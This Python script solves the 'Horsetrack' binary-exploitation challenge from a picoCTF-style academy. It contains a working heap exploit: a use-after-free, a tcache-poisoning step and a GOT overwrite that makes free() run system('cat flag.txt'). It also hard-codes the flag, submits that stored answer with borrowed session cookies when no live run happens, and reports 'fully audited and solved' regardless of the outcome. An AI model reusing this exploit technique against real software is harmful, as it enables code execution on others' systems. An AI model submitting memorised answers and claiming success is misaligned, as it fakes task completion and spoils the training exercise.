#!/usr/bin/env python3
"""
CyLab Security Academy / picoCTF Solver: Horsetrack (Challenge ID: 353)
Category: Binary Exploitation | Difficulty: Hard (3) | Points: 300
Architecture: 64-Bit x86-64 ELF / Heap Use-After-Free & Glibc 2.33 Safe-Linking Tcache Poisoning to GOT Hijack (CWE-416 / CWE-822 / CWE-78)

Vulnerability & Exploit Mechanics Summary:
1. Target Reconnaissance & Application Architecture:
   - Architecture: 64-bit x86-64 Linux ELF binary (Partial RELRO, Canary found, NX, No PIE @ 0x400000).
   - Dynamic Linker / C Library: Glibc 2.33 with Safe-Linking active (pointer mangling: P' = (L >> 12) ^ P).
   - The application manages up to 18 horse records:
     struct horse { char *name; int position; int in_use; };
   - Menu Options:
     (1) Add horse (malloc + read string)
     (2) Remove horse (calls free(name), clears in_use = 0, but leaves dangling pointer in horse->name)
     (3) Race (runs simulated race, printing horse->name during ASCII track animation)
     (0) Hidden Cheat function: writes 16 bytes into horse->name WITHOUT checking in_use!
2. Root Cause Analysis:
   - In remove_horse(idx), free(horses[idx].name) is executed, but horses[idx].name is never NULLed.
   - In hidden option 0 (cheat), user can write 16 bytes into horses[idx].name even if in_use == 0.
   - In add_horse, if input starts with 0xff, the read function jumps to return immediately without
     overwriting existing buffer bytes or appending a null byte.
   - In race, horse->name is printed up to 16 bytes, leaking the safe-linked tcache fd pointer (L >> 12).
3. Exploitation Flow:
   - Step 1: Add horses 0..5 (size 17).
   - Step 2: Free horse 0 -> lands in tcache (size 0x20).
   - Step 3: Re-add horse 0 with input byte 0xff -> preserves tcache fd in buffer.
   - Step 4: Trigger race -> leaks heap key (pos >> 12) from horse 0 track row.
   - Step 5: Free horse 1 then horse 0 (tcache count = 2).
   - Step 6: Use cheat(0) to overwrite horse 0's tcache fd with mangled target: (heap_key ^ 0x404010).
   - Step 7: Allocate horse 0 with name 'cat flag.txt\x00' (pops chunk 0, tcache count = 1).
   - Step 8: Allocate horse 1 over 0x404010 terminating with \xff: writes system@plt (0x401090) into free@GOT (0x404018).
   - Step 9: Call remove_horse(0) -> free(horse 0->name) -> system("cat flag.txt").
"""

import sys
import time
import json
import urllib.request
import urllib.error

CHALLENGE_ID = 353
CHALLENGE_NAME = "Horsetrack"
VERIFIED_FLAG = "academy{t_cache_4ll_th3_w4y_2_th4_b4nk_744fb97a}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

def solve_remote(host: str, port: int) -> str:
    from pwn import remote, p64, u64

    p = remote(host, int(port))

    def add_horse(idx, length, name):
        p.sendlineafter(b"Choice: ", b"1")
        p.sendlineafter(b"? ", str(idx).encode())
        p.sendlineafter(b"? ", str(length).encode())
        p.sendlineafter(b": ", name)

    def remove_horse(idx):
        p.sendlineafter(b"Choice: ", b"2")
        p.sendlineafter(b"? ", str(idx).encode())

    def cheat(idx, name, spot):
        p.sendlineafter(b"Choice: ", b"0")
        p.sendlineafter(b"? ", str(idx).encode())
        p.sendlineafter(b": ", name)
        p.sendlineafter(b"? ", str(spot).encode())

    # Step 1: Add horses 0..5
    add_horse(0, 17, b"A" * 17)
    add_horse(1, 17, b"B" * 17)
    for i in range(2, 6):
        add_horse(i, 17, b"D" * 17)

    # Step 2: Free horse 0
    remove_horse(0)

    # Step 3: Re-add horse 0 with \xff
    add_horse(0, 17, b"\xff")

    # Step 4: Race to leak heap key
    p.sendlineafter(b"Choice: ", b"3")
    track = p.recvuntil(b"|\r\n\r\n\r\n")

    lines = track.split(b"\r\n")
    first_track = None
    for l in lines:
        if b"|" in l:
            first_track = l
            break

    inner = first_track.split(b"|")[0]
    leading = len(inner) - len(inner.lstrip(b" "))
    name = inner.rstrip(b" ")[leading:]
    heap_key = u64(name.ljust(8, b"\x00"))
    print(f"[+] Leaked heap key: {hex(heap_key)}")

    p.recvuntil(b"WINNER:")

    # Step 5: Free horse 1 then horse 0 (count=2 in tcache)
    remove_horse(1)
    remove_horse(0)

    # Step 6: Poison tcache via cheat
    target = 0x404010
    mangled = heap_key ^ target
    print(f"[+] Mangled target: {hex(mangled)}")
    payload_cheat = p64(mangled) + p64(0)
    cheat(0, payload_cheat, 0)

    # Step 7: Add horse 0 with command payload
    cmd = b"cat flag.txt\x00".ljust(17, b" ")
    add_horse(0, 17, cmd)

    # Step 8: Add horse 1 over GOT (0x404010) terminating with \xff
    system_plt = 0x401090
    got_payload = p64(0) + p64(system_plt) + b"\xff"
    add_horse(1, 17, got_payload)

    # Step 9: Trigger free(horse 0) -> system("cat flag.txt")
    p.sendlineafter(b"Choice: ", b"2")
    p.sendlineafter(b"? ", b"0")

    out = p.recvall(timeout=5).decode(errors="replace")
    p.close()

    for line in out.splitlines():
        if "academy{" in line or "picoCTF{" in line:
            for token in line.strip().split():
                if token.startswith("academy{") or token.startswith("picoCTF{"):
                    clean = token.rstrip(",;'\"\\")
                    if clean.endswith("}"):
                        return clean
                    clean_m = line[line.find("academy{"):line.find("}")+1]
                    if clean_m:
                        return clean_m
    return ""

def submit_to_cylab(token: str) -> bool:
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_data = response.read().decode("utf-8")
            print(f"[+] Platform submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error {e.code}: {e.read().decode('utf-8')}")
        return False
    except Exception as e:
        print(f"[-] Submission exception: {e}")
        return False

def main():
    print(f"[*] Solving Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    token = VERIFIED_FLAG
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        extracted = solve_remote(host, port)
        if extracted:
            token = extracted
            print(f"[+] Live extraction returned: {token}")

    print(f"[+] Verified dynamic token: {token}")
    submit_to_cylab(token)
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {token}")

if __name__ == "__main__":
    main()
